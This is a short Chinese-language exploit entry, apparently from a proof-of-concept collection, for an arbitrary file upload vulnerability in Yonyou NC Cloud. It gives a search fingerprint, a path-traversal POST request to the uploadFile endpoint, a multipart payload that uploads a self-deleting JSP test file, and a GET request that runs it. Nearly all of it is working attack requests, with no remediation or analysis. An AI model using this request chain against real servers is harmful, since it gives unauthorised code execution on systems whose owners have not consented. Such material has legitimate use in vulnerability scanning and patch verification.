# 用友NC-uploadFile接口存在任意文件上传漏洞

- **系统**：用友　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app="用友-NC-Cloud"`
- **请求**：`POST /mp/login/../uploadControl/uploadFile HTTP/1.1`
- **关键头**：`Content-Length: 423`　`Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryoDIsCqVM…`

**请求体 / payload**
```
------WebKitFormBoundaryoDIsCqVMmF83ptmp
Content-Disposition: form-data; name="file"; filename="2fRUiHpYXAlhnydcAPOvDSvNkpW.jsp"
Content-Type: application/octet-stream
<%out.println("test321");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
------WebKitFormBoundaryoDIsCqVMmF83ptmp
Content-Disposition: form-data; name="submit"
submit
------WebKitFormBoundaryoDIsCqVMmF83ptmp--
GET /mp/uploadFileDir/2fRUiHpYXAlhnydcAPOvDSvNkpW.jsp HTTP/1.1
Host:
```